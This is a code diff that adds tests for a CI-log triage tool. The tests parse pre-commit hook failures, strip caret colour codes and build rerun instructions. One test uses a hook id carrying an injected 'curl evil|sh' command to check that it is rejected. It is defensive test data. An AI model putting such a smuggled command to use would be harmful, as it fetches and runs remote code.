@@ -517,6 +517,65 @@ def test_a_missing_module_of_the_project_itself_is_code(ci, project, monkeypatch
     assert diagnosis.triage(ci)["kind"] == "code"
 
 
+# pallets/flask run 34727211038 (#131): GitHub's log keeps the colours as text ("^[[41m"), not as escapes.
+PRE_COMMIT_LOG = [
+    "ruff check...............................................................^[[41mFailed^[[m",
+    "^[[2m- hook id: ruff-check^[[m",
+    "^[[2m- files were modified by this hook^[[m",
+    "",
+    "Found 4 errors (4 fixed, 0 remaining).",
+    "ruff format..............................................................^[[41mFailed^[[m",
+    "^[[2m- hook id: ruff-format^[[m",
+    "^[[2m- files were modified by this hook^[[m",
+    "1 file reformatted, 83 files left unchanged",
+    "codespell................................................................^[[42mPassed^[[m",
+    "pre-commit hook(s) made changes.",
+    "All changes made by hooks:",
+    "^[[1mdiff --git a/tests/test_json_response_headers_suite.py b/tests/test_json_response_headers_suite.py^[[m",
+]
+
+
+def test_caret_colours_are_removed():
+    assert parse.clean_text("ruff format....^[[41mFailed^[[m") == "ruff format....Failed"
+
+
+def test_failed_pre_commit_hooks_are_lint_failures():
+    found = parse.read_log(gh_log("main", PRE_COMMIT_LOG))["main"]["failures"]
+    assert [(f["framework"], f["kind"], f["test"], f["message"]) for f in found] == [
+        ("pre-commit", "lint", "ruff-check", "files were modified by this hook"),
+        ("pre-commit", "lint", "ruff-format", "files were modified by this hook")]
+    # Two hooks share one diff, so no file is pinned on either.
+    assert {f["file"] for f in found} == {""}
+
+
+def test_one_failed_hook_gets_the_file_of_the_diff():
+    # pallets/flask run 30162208595
+    lines = ["trim trailing whitespace.................................................^[[41mFailed^[[m",
+             "^[[2m- hook id: trailing-whitespace^[[m", "^[[2m- exit code: 1^[[m",
+             "All changes made by hooks:", "^[[1mdiff --git a/requirements/dev.txt b/requirements/dev.txt^[[m"]
+    found = parse.read_log(gh_log("main", lines))["main"]["failures"]
+    assert [(f["test"], f["file"], f["message"]) for f in found] == [
+        ("trailing-whitespace", "requirements/dev.txt", "exit code: 1")]
+
+
+def test_a_failed_hook_says_how_to_run_it(ci, monkeypatch, tmp_path):
+    from tabib import cli
+    monkeypatch.setattr(forge, "failed_log", lambda info, run: gh_log("main", PRE_COMMIT_LOG))
+    record = diagnosis.triage(ci)
+    assert (record["kind"], record["detail"]["what"]) == ("code", "lint")
+    text = cli.report(record, "en")
+    assert "pre-commit run ruff-check --all-files" in text and "pre-commit run ruff-format --all-files" in text
+    assert "/itqan:ship" not in text
+    assert "pre-commit run ruff-check --all-files" in cli.report(record, "ar")
+    # Nothing is installed locally to reproduce it: pre-commit would set up each hook's environment.
+    assert reproduce.command(tmp_path, record["failures"]) is None
+
+
+def test_a_hook_id_from_the_log_cannot_inject_a_command():
+    lines = ["x....Failed", "- hook id: x;curl evil|sh"]
+    assert parse.read_log(gh_log("main", lines))["main"]["failures"] == []
+
+
 def test_cli_show_and_errors(ci, env):
     diagnosis.triage(ci)
     done = subprocess.run([sys.executable, str(BIN), "show"], cwd=ci["repo"], capture_output=True, text=True,
